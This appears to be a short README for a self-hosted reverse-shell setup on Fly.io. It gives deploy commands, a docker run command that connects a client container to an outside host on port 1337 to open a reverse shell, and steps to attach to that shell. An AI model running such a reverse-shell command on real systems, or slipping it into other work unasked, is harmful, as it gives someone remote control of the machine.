```
fly launch --no-deploy --copy-config
fly deploy
```

On the prompt to tweak settings, press "yes", set port to 0.

# Initiate reverse shell:

```
docker run --hostname=client -it -e SERVER_ADDRESS=reverse-shell.heywoodlh.io -e SERVER_PORT=1337 --rm docker.io/heywoodlh/reverse-shell:client
```

# Attach to reverse shell

```
fly ssh console
/attach.sh
```
